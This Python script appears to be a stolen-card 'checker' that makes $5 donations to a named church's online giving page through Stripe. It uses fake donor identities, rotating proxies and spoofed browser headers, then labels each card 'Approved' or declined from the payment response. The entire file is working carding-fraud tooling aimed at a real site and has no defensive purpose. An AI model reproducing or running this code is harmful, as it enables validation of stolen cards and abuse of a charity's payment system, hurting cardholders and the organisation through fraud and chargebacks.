import random
import aiohttp
import asyncio
import json
import names
import platform
import ssl
import certifi
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()
if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}@gmail.com"

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


async def LuxyCHK(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        try:
            splitter = cc.split('|')
            ccnum    = splitter[0]
            mes      = splitter[1]
            ano      = splitter[2]
            cvv      = splitter[3] 
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://www.thefaithcenter.com/wpsd-thank-you/?donation=success',
                'Connection': 'keep-alive',
                # 'Cookie': '_ga=GA1.2.804621448.1676905367; _gid=GA1.2.233862839.1676905367; __stripe_mid=23e00235-57bf-4ca5-a0b1-3f9f7cd7f5bed3fce7; __stripe_sid=7c59ce21-d8b5-46c9-853a-dbcaa237fa2155bd30',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
            })
            async with session.get('https://www.thefaithcenter.com/online-giving-2/', proxy=str(proxyrand), timeout=18) as resp:
                try :          
                    response = await resp.text()  
                    lines = response.split("\n")
                    for i in lines:
                        if "var wpsdAdminScriptObj = " in i:
                            sucio = i.replace('var wpsdAdminScriptObj = ',"").replace(';',"")
                    finallyr = json.loads(sucio)
                    security = finallyr['security']

                    #soup = BeautifulSoup(response, 'lxml')
                    #asp_product_id = soup.find("input", {"name": "asp_product_id"})["value"]
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ⚠' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ⚠' 

            data = {
                'action': 'wpsd_donation',
                'name': f'{first} {last} {random.randint(1000,999999)}',
                'email': CorreoRand,
                'amount': '5',
                'donation_for': 'Tithe',
                'currency': 'USD',
                'idempotency': f'{random.randint(1000,999999)}QPdrHu5h{random.randint(1000,999999)}',
                'security': security,
                'stripeSdk': '',
            }
            async with session.post('https://www.thefaithcenter.com/wp-admin/admin-ajax.php',  data=data, proxy=str(proxyrand), timeout=18) as resp:
                try :
                    responsejs = await resp.json()
                    #responsetx = await resp.text()
                    client_secret = responsejs['data']['client_secret']
                    pi_ = str(client_secret).split("_secret_")[0]
                    #jsonresponse = await resp.json()
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ⚠' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ⚠' 
                except (aiohttp.client_exceptions.ContentTypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ⚠' 

            data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]={first}+{last}&payment_method_data[billing_details][email]={first}{last}{random.randint(100,99999)}%40gmail.com&payment_method_data[card][number]={ccnum}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=018cdd62-6526-4606-87f8-18445a47f6fc9f9089&payment_method_data[muid]=23e00235-57bf-4ca5-a0b1-3f9f7cd7f5bed3fce7&payment_method_data[sid]=7c59ce21-d8b5-46c9-853a-dbcaa237fa2155bd30&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Ff{random.randint(10000000,99999999)}%3B+stripe-js-v3%2Ff{random.randint(10000000,99999999)}&payment_method_data[time_on_page]={random.randint(10000,99999)}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_zEGhAltXo7v6yoyhjHojehqI&client_secret={client_secret}'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                'Accept': 'application/json',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                # Requests doesn't support trailers
                # 'TE': 'trailers',
            }
            async with session.post(f'https://api.stripe.com/v1/payment_intents/{pi_}/confirm', proxy=str(proxyrand), headers=headers, data=data, timeout=18) as resp:
                try :
                    responsetxt = await resp.text()
                    response = await resp.json()
                except (UnboundLocalError):
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ⚠' 
                except (TypeError):
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ⚠'        
          
            if int(responsetxt.find('incorrect_cvc')) > 0 :
                code = str(response['error']['code'])
                message = str(response['error']['message'])
                await session.close()
                return "Approved", f"{message} | {code}"
            elif int(responsetxt.find('insufficient_funds')) > 0 :
                code = str(response['error']['code'])
                message = str(response['error']['message'])
                await session.close()
                return "Approved", f"{message} | {code}"
            elif int(responsetxt.find('"status": "succeeded"')) > 0 :
                await session.close()
                return "Approved", "Charged 5$"
            if int(responsetxt.find('"status": "requires_source_action"')) > 0 :
                await session.close()
                return "3D Secure(Try Again)"
            elif int(responsetxt.find('stripe_3ds2_fingerprint')) > 0 :
                await session.close()
                return "3D Secure(Try Again)"
            elif int(responsetxt.find('"decline_code"')) > 0 :
                decline_code = str(response['error']['decline_code'])
                message = str(response['error']['message'])
                await session.close()
                return f"{message} | {decline_code}"
            elif int(responsetxt.find('"code"')) > 0 :
                decline_code = str(response['error']['code'])
                message = str(response['error']['message'])
                await session.close()
                return f"{message} | {decline_code}"
            else :
                await session.close()
                print(responsetxt)
                return "An unexpected error occurred in response. It was not generated correctly. ⚠"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ⚠"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ⚠"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ⚠"